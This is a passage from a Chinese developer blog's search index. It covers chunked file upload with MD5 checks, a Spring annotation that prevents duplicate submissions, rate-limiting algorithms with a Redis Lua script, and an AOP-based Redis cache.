console.log(\u0026#34;chunk\u0026#34;,chunk) // addFileToDrive(file.name, file.uniqueIdentifier, file.size).then(() =\u0026gt; { // proxy.$modal.msgSuccess(\u0026#34;文件上传成功\u0026#34;); // }) // 服务端自定义的错误（即http状态码为200，但是是错误的情况），这种错误是Uploader无法拦截的 let res = JSON.parse(response) console.log(\u0026#34;onFileSuccess res:\u0026#34;, res); if (res.code !== 200) { error(res.message) // 文件状态设为“失败” statusSet(file.id, \u0026#39;failed\u0026#39;) return } emits(\u0026#34;uploadSuccess\u0026#34;, file); } /** * 新增的自定义的状态: \u0026#39;md5\u0026#39;、\u0026#39;merging\u0026#39;、\u0026#39;transcoding\u0026#39;、\u0026#39;failed\u0026#39; * @param id * @param status */ function statusSet(id, status) { const statusMap = { md5: { text: \u0026#39;校验MD5\u0026#39;, bgc: \u0026#39;#fff\u0026#39; }, failed: { text: \u0026#39;上传失败\u0026#39;, bgc: \u0026#39;#e2eeff\u0026#39; } } customStatus.value = status nextTick(() =\u0026gt; { const statusTag = document.createElement(\u0026#39;span\u0026#39;) statusTag.className = `custom-status-${id} custom-status` statusTag.innerText = statusMap[status].text statusTag.style.backgroundColor = statusMap[status].bgc // custom-status 样式不生效 // 由于 style脚本 设置了 scoped，深层的样式修改不了 // 通过给当前组件设置一个id，在该id下设置样式，就可以保证样式不全局污染 // statusTag.style.position = \u0026#39;absolute\u0026#39;; // statusTag.style.top = \u0026#39;0\u0026#39;; // statusTag.style.left = \u0026#39;0\u0026#39;; // statusTag.style.right = \u0026#39;0\u0026#39;; // statusTag.style.bottom = \u0026#39;0\u0026#39;; // statusTag.style.zIndex = \u0026#39;1\u0026#39;; const statusWrap = document.querySelector(`.file_${id} .uploader-file-status`) statusWrap.appendChild(statusTag) }) } function statusRemove(id) { customStatus.value = \u0026#39;\u0026#39; nextTick(() =\u0026gt; { const statusTag = document.querySelector(`.custom-status-${id}`) document.querySelector(`.file_${id} .uploader-file-actions`).style.display = \u0026#39;block\u0026#39; statusTag.remove() }) } \u0026lt;/script\u0026gt; md5.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import SparkMD5 from \u0026#39;spark-md5\u0026#39; /** * 分段计算MD5 * @param file {File} * @param options {Object} - onProgress | onSuccess | onError */ export function generateMD5(file, options = {}) { const fileReader = new FileReader() const time = new Date().getTime() const blobSlice = File.prototype.slice || File.prototype.mozSlice || File.prototype.webkitSlice const chunkSize = 10 * 1024 * 1000 const chunks = Math.ceil(file.size / chunkSize) let currentChunk = 0 const spark = new SparkMD5.ArrayBuffer() const loadNext = () =\u0026gt; { let start = currentChunk * chunkSize let end = start + chunkSize \u0026gt;= file.size ? file.size : start + chunkSize fileReader.readAsArrayBuffer(blobSlice.call(file.file, start, end)) } loadNext() fileReader.onload = (e) =\u0026gt; { spark.append(e.target.result) if (currentChunk \u0026lt; chunks) { currentChunk++ loadNext() if (options.onProgress \u0026amp;\u0026amp; typeof options.onProgress == \u0026#39;function\u0026#39;) { options.onProgress(currentChunk, chunks) } } else { let md5 = spark.end() // md5计算完毕 if (options.onSuccess \u0026amp;\u0026amp; typeof options.onSuccess == \u0026#39;function\u0026#39;) { options.onSuccess(md5) } console.log( `MD5计算完毕：${file.name} \\nMD5：${md5} \\n分片：${chunks} 大小:${file.size} 用时：${ new Date().getTime() - time } ms` ) } } fileReader.onerror = function () { console.log(\u0026#39;MD5计算失败\u0026#39;) if (options.onError \u0026amp;\u0026amp; typeof options.onError == \u0026#39;function\u0026#39;) { options.onError() } } } ","permalink":"https://chance7bin.github.io/posts/design/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0/","summary":"本篇文章主要内容是分片上传、断点续传、秒传的实现思路 前言 分片： 分片任务是在前端由vue-simple-uploader插件完成，流程：1.前","title":"断点续传"},{"content":"日常开发中我们经常会遇到前端多次请求同一个接口的问题，比如前端没有做遮罩层，用户点击了多次按钮。全指望着用户来等待也并不靠谱，如果各个接口自己进行防止重复提交的逻辑又显得不是十分优雅了，所以，我们就将对应的逻辑抽出来形成一个注解，方便我们的使用。\n设计思路 根据提交的参数跟间隔时间到缓存中查询，判断两次提交的参数是否相同，如果相同且在间隔时间内则算作是重复提交\nRepeatSubmit注解 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * 自定义注解防止表单重复提交 * * @author 7bin * @date 2023/06/13 */ @Inherited @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface RepeatSubmit { /** * 间隔时间(ms)，小于此时间视为重复提交 */ public int interval() default 5000; /** * 提示消息 */ public String message() default \u0026#34;不允许重复提交，请稍候再试\u0026#34;; } 定义拦截器 首先我们定义了一个抽象类RepeatSubmitInterceptor，对preHandle方法进行了定义，判断方法上是否存在RepeatSubmit 注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 @Component public abstract class RepeatSubmitInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { if (handler instanceof HandlerMethod) { HandlerMethod handlerMethod = (HandlerMethod) handler; Method method = handlerMethod.getMethod(); RepeatSubmit annotation = method.getAnnotation(RepeatSubmit.class); if (annotation != null) { if (this.isRepeatSubmit(request, annotation)) { ApiResponse ajaxResult = ApiResponse.error(annotation.message()); ServletUtils.renderString(response, JSON.toJSONString(ajaxResult)); return false; } } return true; } else { return true; } } /** * 验证是否重复提交由子类实现具体的防重复提交的规则 * * @param request * @return * @throws Exception */ public abstract boolean isRepeatSubmit(HttpServletRequest request, RepeatSubmit annotation); } 子类中实现父类的isRepeatSubmit方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 /** * 判断请求url和数据是否和上一次相同， * 如果和上次相同，则是重复提交表单。 有效时间为5秒内。 */ @Component public class SameUrlDataInterceptor extends RepeatSubmitInterceptor { public final String REPEAT_PARAMS = \u0026#34;repeatParams\u0026#34;; public final String REPEAT_TIME = \u0026#34;repeatTime\u0026#34;; // 令牌自定义标识 @Value(\u0026#34;${token.header}\u0026#34;) private String header; @Autowired private RedisCache redisCache; @SuppressWarnings(\u0026#34;unchecked\u0026#34;) @Override public boolean isRepeatSubmit(HttpServletRequest request, RepeatSubmit annotation) { String nowParams = \u0026#34;\u0026#34;; if (request instanceof RepeatedlyRequestWrapper) { RepeatedlyRequestWrapper repeatedlyRequest = (RepeatedlyRequestWrapper) request; nowParams = HttpHelper.getBodyString(repeatedlyRequest); } // body参数为空，获取Parameter的数据 if (StringUtils.isEmpty(nowParams)) { nowParams = JSON.toJSONString(request.getParameterMap()); } Map\u0026lt;String, Object\u0026gt; nowDataMap = new HashMap\u0026lt;String, Object\u0026gt;(); nowDataMap.put(REPEAT_PARAMS, nowParams); nowDataMap.put(REPEAT_TIME, System.currentTimeMillis()); // 请求地址（作为存放cache的key值） String url = request.getRequestURI(); // 唯一值（没有消息头则使用请求地址） String submitKey = StringUtils.trimToEmpty(request.getHeader(header)); // 唯一标识（指定key + url + 消息头） String cacheRepeatKey = CacheConstants.REPEAT_SUBMIT_KEY + url + \u0026#34;/\u0026#34; + submitKey; Object sessionObj = redisCache.getCacheObject(cacheRepeatKey); if (sessionObj != null) { Map\u0026lt;String, Object\u0026gt; sessionMap = (Map\u0026lt;String, Object\u0026gt;) sessionObj; if (sessionMap.containsKey(url)) { Map\u0026lt;String, Object\u0026gt; preDataMap = (Map\u0026lt;String, Object\u0026gt;) sessionMap.get(url); if (compareParams(nowDataMap, preDataMap) \u0026amp;\u0026amp; compareTime(nowDataMap, preDataMap, annotation.interval())) { return true; } } } Map\u0026lt;String, Object\u0026gt; cacheMap = new HashMap\u0026lt;String, Object\u0026gt;(); cacheMap.put(url, nowDataMap); redisCache.set(cacheRepeatKey, cacheMap, annotation.interval(), TimeUnit.MILLISECONDS); return false; } /** * 判断参数是否相同 */ private boolean compareParams(Map\u0026lt;String, Object\u0026gt; nowMap, Map\u0026lt;String, Object\u0026gt; preMap) { String nowParams = (String) nowMap.get(REPEAT_PARAMS); String preParams = (String) preMap.get(REPEAT_PARAMS); return nowParams.equals(preParams); } /** * 判断两次间隔时间 */ private boolean compareTime(Map\u0026lt;String, Object\u0026gt; nowMap, Map\u0026lt;String, Object\u0026gt; preMap, int interval) { long time1 = (Long) nowMap.get(REPEAT_TIME); long time2 = (Long) preMap.get(REPEAT_TIME); if ((time1 - time2) \u0026lt; interval) { return true; } return false; } } 值得注意的一个地方\n为什么前面要带一个url拼接submitKey（token）呢？\n1 2 3 4 5 // 唯一值（没有消息头则使用请求地址） String submitKey = StringUtils.trimToEmpty(request.getHeader(header)); // 唯一标识（指定key + url + 消息头） String cacheRepeatKey = CacheConstants.REPEAT_SUBMIT_KEY + url + \u0026#34;/\u0026#34; + submitKey; 原因是有的时候并不是所有的请求都有token，这个时候如果我们不对对应的url进行拦截的话，那么他们就可以在未登录的情况下对某些无需登录却十分耗时的页面进行多次请求，而如果对url也进行了拦截，就不会有这个问题了。可以对这个url的访问次数进行限制了。\n注册拦截器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @Configuration public class ResourcesConfig implements WebMvcConfigurer { @Autowired private RepeatSubmitInterceptor repeatSubmitInterceptor; /** * 自定义拦截规则 */ @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(repeatSubmitInterceptor).addPathPatterns(\u0026#34;/**\u0026#34;); } } 注册过滤器 构建可重复读取inputStream的request\nFilterConfig\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Configuration public class FilterConfig { @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @Bean public FilterRegistrationBean someFilterRegistration() { FilterRegistrationBean registration = new FilterRegistrationBean(); registration.setFilter(new RepeatableFilter()); registration.addUrlPatterns(\u0026#34;/*\u0026#34;); registration.setName(\u0026#34;repeatableFilter\u0026#34;); registration.setOrder(FilterRegistrationBean.LOWEST_PRECEDENCE); return registration; } } RepeatableFilter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 /** * Repeatable 过滤器 * * @author 7bin */ public class RepeatableFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { ServletRequest requestWrapper = null; if (request instanceof HttpServletRequest \u0026amp;\u0026amp; StringUtils.startsWithIgnoreCase(request.getContentType(), MediaType.APPLICATION_JSON_VALUE)) { requestWrapper = new RepeatedlyRequestWrapper((HttpServletRequest) request, response); } if (null == requestWrapper) { chain.doFilter(request, response); } else { chain.doFilter(requestWrapper, response); } } @Override public void destroy() { } } RepeatedlyRequestWrapper\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 /** * 构建可重复读取inputStream的request * * @author 7bin */ public class RepeatedlyRequestWrapper extends HttpServletRequestWrapper { private final byte[] body; public RepeatedlyRequestWrapper(HttpServletRequest request, ServletResponse response) throws IOException { super(request); request.setCharacterEncoding(Constants.UTF8); response.setCharacterEncoding(Constants.UTF8); body = HttpHelper.getBodyString(request).getBytes(Constants.UTF8); } @Override public BufferedReader getReader() throws IOException { return new BufferedReader(new InputStreamReader(getInputStream())); } @Override public ServletInputStream getInputStream() throws IOException { final ByteArrayInputStream bais = new ByteArrayInputStream(body); return new ServletInputStream() { @Override public int read() throws IOException { return bais.read(); } @Override public int available() throws IOException { return body.length; } @Override public boolean isFinished() { return false; } @Override public boolean isReady() { return false; } @Override public void setReadListener(ReadListener readListener) { } }; } } 注解使用 在controller中对需要设置防重复提交的方法加上@RepeatSubmit\n1 2 3 4 5 6 7 8 9 /** * 修改用户 */ @RepeatSubmit @PutMapping(\u0026#34;/profile\u0026#34;) public ApiResponse updateProfile(@RequestBody SysUser user) { ... } ","permalink":"https://chance7bin.github.io/posts/design/%E9%98%B2%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/","summary":"日常开发中我们经常会遇到前端多次请求同一个接口的问题，比如前端没有做遮罩层，用户点击了多次按钮。全指望着用户来等待也并不靠谱，如果各个接口自","title":"防重复提交"},{"content":"针对软件系统来说，限流就是对请求的速率进行限制，避免瞬时的大量请求击垮软件系统。毕竟，软件系统的处理能力是有限的。如果说超过了其处理能力的范围，软件系统可能直接就挂掉了。\n限流可能会导致用户的请求无法被正确处理，不过，这往往也是权衡了软件系统的稳定性之后得到的最优解。\n现实生活中，处处都有限流的实际应用，就比如排队买票是为了避免大量用户涌入购票而导致售票员无法处理\n常见限流算法 固定窗口计数器算法 固定窗口其实就是时间窗口。固定窗口计数器算法 规定了我们单位时间处理的请求数量。\n假如我们规定系统中某个接口 1 分钟只能访问 33 次的话，使用固定窗口计数器算法的实现思路如下：\n给定一个变量 counter 来记录当前接口处理的请求数量，初始值为 0（代表接口当前 1 分钟内还未处理请求）。 1 分钟之内每处理一个请求之后就将 counter+1 ，当 counter=33 之后（也就是说在这 1 分钟内接口已经被访问 33 次的话），后续的请求就会被全部拒绝。 等到 1 分钟结束后，将 counter 重置 0，重新开始计数。 这种限流算法无法保证限流速率，因而无法保证突然激增的流量。\n就比如说我们限制某个接口 1 分钟只能访问 1000 次，该接口的 QPS 为 500，前 55s 这个接口 1 个请求没有接收，后 1s 突然接收了 1000 个请求。然后，在当前场景下，这 1000 个请求在 1s 内是没办法被处理的，系统直接就被瞬时的大量请求给击垮了。\n滑动窗口计数器算法 滑动窗口计数器算法 算的上是固定窗口计数器算法的升级版。\n滑动窗口计数器算法相比于固定窗口计数器算法的优化在于：它把时间以一定比例分片\n漏桶算法 我们可以把发请求的动作比作成注水到桶中，我们处理请求的过程可以比喻为漏桶漏水。我们往桶中以任意速率流入水，以一定速率流出水。当水超过桶流量则丢弃，因为桶容量是不变的，保证了整体的速率。\n实现这个算法，准备一个队列用来保存请求，然后我们定期从队列中拿请求来执行就好了（和消息队列削峰/限流的思想是一样的）。\n令牌桶算法 和漏桶算法算法一样，我们的主角还是桶（这限流算法和桶过不去啊）。不过现在桶里装的是令牌了，请求在被处理之前需要拿到一个令牌，请求处理完毕之后将这个令牌丢弃（删除）。我们根据限流大小，按照一定的速率往桶里添加令牌。如果桶装满了，就不能继续往里面继续添加令牌了。\n限流实现 工具类 1.Google Guava 自带的限流工具类 RateLimiter\nRateLimiter 基于令牌桶算法，可以应对突发流量。\n除了最基本的令牌桶算法(平滑突发限流)实现之外，Guava 的RateLimiter还提供了 平滑预热限流 的算法实现。\n平滑突发限流就是按照指定的速率放令牌到桶里，而平滑预热限流会有一段预热时间，预热时间之内，速率会逐渐提升到配置的速率。\nGuava 地址：https://github.com/google/guava\n2.Bucket4j\nBucket4j 是一个非常不错的基于令牌/漏桶算法的限流库\nBucket4j 地址：https://github.com/vladimir-bukhtoyarov/bucket4j\n3.Resilience4j\nResilience4j 是一个轻量级的容错组件，其灵感来自于 Hystrix。自Netflix 宣布不再积极开发 Hystrixopen in new window 之后，Spring 官方和 Netflix 都更推荐使用 Resilience4j 来做限流熔断。\nResilience4j 地址: https://github.com/resilience4j/resilience4j\n自定义实现 实现固定窗口计数器算法\n**Redis+Lua **\n减少了网络开销：我们可以利用 Lua 脚本来批量执行多条 Redis 命令，这些 Redis 命令会被提交到 Redis 服务器一次性执行完成，大幅减小了网络开销。\n原子性：一段 Lua 脚本可以视作一条命令执行，一段 Lua 脚本执行过程中不会有其他脚本或 Redis 命令同时执行，保证了操作不会被其他指令插入或打扰。\nRedisConfig 在redis的配置中编写Lua脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 @Bean public DefaultRedisScript\u0026lt;Long\u0026gt; limitScript() { DefaultRedisScript\u0026lt;Long\u0026gt; redisScript = new DefaultRedisScript\u0026lt;\u0026gt;(); redisScript.setScriptText(limitScriptText()); redisScript.setResultType(Long.class); return redisScript; } /** * 限流脚本 */ private String limitScriptText() { return \u0026#34;local key = KEYS[1]\\n\u0026#34; + \u0026#34;local count = tonumber(ARGV[1])\\n\u0026#34; + \u0026#34;local time = tonumber(ARGV[2])\\n\u0026#34; + \u0026#34;local current = redis.call(\u0026#39;get\u0026#39;, key);\\n\u0026#34; + \u0026#34;if current and tonumber(current) \u0026gt; count then\\n\u0026#34; + \u0026#34; return tonumber(current);\\n\u0026#34; + \u0026#34;end\\n\u0026#34; + \u0026#34;current = redis.call(\u0026#39;incr\u0026#39;, key)\\n\u0026#34; + \u0026#34;if tonumber(current) == 1 then\\n\u0026#34; + \u0026#34; redis.call(\u0026#39;expire\u0026#39;, key, time)\\n\u0026#34; + \u0026#34;end\\n\u0026#34; + \u0026#34;return tonumber(current);\u0026#34;; } RateLimiterAspect 定义一个切面，实现基于注解的流量控制\n1 2 3 4 5 6 7 // 在对应的注解中通过传入参数key的名称，限制次数，过期时间，来进行统计 Long number = redisTemplate.execute(limitScript, keys, count, time); if (StringUtils.isNull(number) || number.intValue() \u0026gt; count) { throw new ServiceException(\u0026#34;访问过于频繁，请稍候再试\u0026#34;); } log.info(\u0026#34;限制请求\u0026#39;{}\u0026#39;,当前请求\u0026#39;{}\u0026#39;,缓存key\u0026#39;{}\u0026#39;\u0026#34;, count, number.intValue(), combineKey); 首先获得对应的key当前存储的值，如果当前存储的值大于限制次数，直接返回，如果不大于，那么此值调用incr命令去做加1操作。 如果加1之后current为1，给它设置一个过期时间，从而保证它在限制时间后可以被销毁，从而进行一个新的统计。\n限流注解 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface RateLimiter { /** * 限流key */ public String key() default CacheConstants.RATE_LIMIT_KEY; /** * 限流时间,单位秒 */ public int time() default 60; /** * 限流次数 */ public int count() default 100; /** * 限流类型 */ public LimitType limitType() default LimitType.DEFAULT; } ","permalink":"https://chance7bin.github.io/posts/design/%E9%99%90%E6%B5%81/","summary":"针对软件系统来说，限流就是对请求的速率进行限制，避免瞬时的大量请求击垮软件系统。毕竟，软件系统的处理能力是有限的。如果说超过了其处理能力的范","title":"限流"},{"content":"Spring AOP 实现 Redis 缓存切面 @EnableCaching spring boot提供了比较简单的缓存方案。只要使用 @EnableCaching 即可完成简单的缓存功能。\nhttps://blog.csdn.net/micro_hz/article/details/76599632\n参考博客 Spring的面向切面编程（AOP）\nSpring AOP 实现 Redis 缓存切面\nSpringBoot中通过自定义缓存注解(AOP切面拦截)实现数据库数据缓存到Redis\nSpringBoot + Redis：基本配置及使用\nSpring中自定义注解支持SpEl表达式（仅限在AOP中使用）\n添加依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!--redis--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--spring2.0集成redis所需common-pool2--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-pool2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-aspects --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aspects\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.3.14.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; yml配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 spring: data: redis: repositories: enabled: false redis: # Redis默认情况下有16个分片，这里配置具体使用的分片，默认是0 database: 0 host: localhost port: 6379 # 连接密码（默认为空） password: # 连接超时时间（毫秒) timeout: 10000ms lettuce: pool: # 连接池最大连接数（使用负值表示没有限制） 默认 8 max-active: 8 # 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1 max-wait: -1 # 连接池中的最大空闲连接 默认 8 max-idle: 8 # 连接池中的最小空闲连接 默认 0 min-idle: 0 代码 自定义RedisTemplate 使用fastjson进行序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package njgis.opengms.portal.config; import com.fasterxml.jackson.annotation.JsonAutoDetect; import com.fasterxml.jackson.annotation.JsonTypeInfo; import com.fasterxml.jackson.annotation.PropertyAccessor; import com.fasterxml.jackson.databind.ObjectMapper; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.redis.connection.RedisConnectionFactory; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer; import org.springframework.data.redis.serializer.RedisSerializer; import org.springframework.data.redis.serializer.StringRedisSerializer; /** * @Description * @Author bin * @Date 2022/07/19 */ @Configuration public class RedisConfig { @Bean public RedisTemplate\u0026lt;String, Object\u0026gt; template(RedisConnectionFactory factory) { // 创建RedisTemplate\u0026lt;String, Object\u0026gt;对象 RedisTemplate\u0026lt;String, Object\u0026gt; template = new RedisTemplate\u0026lt;\u0026gt;(); // 配置连接工厂 template.setConnectionFactory(factory); // redis key 序列化方式使用stringSerial template.setKeySerializer(new StringRedisSerializer()); // redis value 序列化方式自定义 // template.setValueSerializer(new GenericFastJsonRedisSerializer()); template.setValueSerializer(valueSerializer()); // redis hash key 序列化方式使用stringSerial template.setHashKeySerializer(new StringRedisSerializer()); // redis hash value 序列化方式自定义 // template.setHashValueSerializer(new GenericFastJsonRedisSerializer()); template.setHashValueSerializer(valueSerializer()); return template; } private RedisSerializer\u0026lt;Object\u0026gt; valueSerializer() { Jackson2JsonRedisSerializer\u0026lt;Object\u0026gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer\u0026lt;\u0026gt;(Object.class); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); // 此项必须配置，否则如果序列化的对象里边还有对象，会报如下错误： // java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to XXX objectMapper.activateDefaultTyping( objectMapper.getPolymorphicTypeValidator(), ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); // 旧版写法： // objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); jackson2JsonRedisSerializer.setObjectMapper(objectMapper); return jackson2JsonRedisSerializer; } } redis缓存注解：插入 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import njgis.opengms.portal.enums.ItemTypeEnum; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @Description 新增redis缓存 * @Author bin * @Date 2022/07/19 */ @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) public @interface AopCacheEnable { //redis缓存key String key(); //redis缓存存活时间默认值（可自定义） long expireTime() default 3600; //redis缓存的分组 ItemTypeEnum group() default ItemTypeEnum.PortalItem; } redis缓存注解：删除 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @Description * @Author bin * @Date 2022/07/19 */ @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) public @interface AopCacheEvict { //redis中的key值 String key(); //redis缓存的分组 String group(); } 自定义缓存切面具体实现类 CacheEnableAspect.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 import lombok.extern.slf4j.Slf4j; import njgis.opengms.portal.enums.ItemTypeEnum; import njgis.opengms.portal.service.RedisService; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.Signature; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Pointcut; import org.aspectj.lang.reflect.MethodSignature; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.core.DefaultParameterNameDiscoverer; import org.springframework.expression.EvaluationContext; import org.springframework.expression.Expression; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.expression.spel.support.StandardEvaluationContext; import org.springframework.stereotype.Component; import java.lang.reflect.Method; /** * @Description 自定义缓存切面具体实现类 * @Author bin * @Date 2022/07/19 */ @Slf4j @Aspect @Component public class CacheEnableAspect { @Autowired RedisService redisService; /** * 用于SpEL表达式解析. */ private SpelExpressionParser parser = new SpelExpressionParser(); /** * 用于获取方法参数定义名字. */ private DefaultParameterNameDiscoverer nameDiscoverer = new DefaultParameterNameDiscoverer(); /** * Mapper层切点 使用到了我们定义的 AopCacheEnable 作为切点表达式。 */ @Pointcut(\u0026#34;@annotation(njgis.opengms.portal.component.AopCacheEnable)\u0026#34;) public void queryCache() { } /** * Mapper层切点 使用到了我们定义的 AopCacheEvict 作为切点表达式。 */ @Pointcut(\u0026#34;@annotation(njgis.opengms.portal.component.AopCacheEvict)\u0026#34;) public void ClearCache() { } @Around(\u0026#34;queryCache()\u0026#34;) public Object Interceptor(ProceedingJoinPoint pjp) throws Throwable { // StringBuilder redisKeySb = new StringBuilder(\u0026#34;AOP\u0026#34;).append(\u0026#34;::\u0026#34;); StringBuilder redisKeySb = new StringBuilder(\u0026#34;AOP\u0026#34;); // 类 // String className = pjp.getTarget().toString().split(\u0026#34;@\u0026#34;)[0]; // redisKeySb.append(className).append(\u0026#34;::\u0026#34;); //获取当前被切注解的方法名 Method method = getMethod(pjp); //获取当前被切方法的注解 AopCacheEnable aopCacheEnable = method.getAnnotation(AopCacheEnable.class); if (aopCacheEnable == null) { return pjp.proceed(); } //获取被切注解方法返回类型 // Type returnType = method.getAnnotatedReturnType().getType(); // String[] split = returnType.getTypeName().split(\u0026#34;\\\\.\u0026#34;); // String type = split[split.length - 1]; // redisKeySb.append(\u0026#34;:\u0026#34;).append(type); //从注解中获取key //通过注解key使用的SpEL表达式获取到SpEL执行结果 String key = aopCacheEnable.key(); // redisKeySb.append(args); String resV = generateKeyBySpEL(key, pjp).toString(); redisKeySb.append(\u0026#34;:\u0026#34;).append(aopCacheEnable.group()).append(\u0026#34;:\u0026#34;).append(resV); //获取方法参数值 // Object[] arguments = pjp.getArgs(); // redisKeySb.append(\u0026#34;:\u0026#34;).append(arguments[0]); String redisKey = redisKeySb.toString(); Object result = redisService.get(redisKey); if (result != null) { log.info(\u0026#34;从Redis中获取数据：{}\u0026#34;, result); return result; } else { try { result = pjp.proceed(); log.info(\u0026#34;从数据库中获取数据：{}\u0026#34;, result); } catch (Throwable e) { throw new RuntimeException(e.getMessage(), e); } // 获取失效时间 long expire = aopCacheEnable.expireTime(); redisService.set(redisKey, result, expire); } return result; } /*** 定义清除缓存逻辑，先操作数据库，后清除缓存*/ @Around(value = \u0026#34;ClearCache()\u0026#34;) public Object evict(ProceedingJoinPoint pjp) throws Throwable { StringBuilder redisKeySb = new StringBuilder(\u0026#34;AOP\u0026#34;); Method method = getMethod(pjp); // 获取方法的注解 AopCacheEvict cacheEvict = method.getAnnotation(AopCacheEvict.class); if (cacheEvict == null) { return pjp.proceed(); } //从注解中获取key //通过注解key使用的SpEL表达式获取到SpEL执行结果 String key = cacheEvict.key(); // redisKeySb.append(args); key = generateKeyBySpEL(key, pjp).toString(); //清楚缓存的group从参数拿 String group = cacheEvict.group(); ItemTypeEnum type = (ItemTypeEnum)generateKeyBySpEL(group, pjp); redisKeySb.append(\u0026#34;:\u0026#34;).append(type).append(\u0026#34;:\u0026#34;).append(key); //先操作db Object result = pjp.proceed(); //根据key从缓存中删除 String redisKey = redisKeySb.toString(); redisService.delete(redisKey); return result; } /** * 获取被拦截方法对象 */ public Method getMethod(ProceedingJoinPoint pjp) { Signature signature = pjp.getSignature(); MethodSignature methodSignature = (MethodSignature) signature; Method targetMethod = methodSignature.getMethod(); return 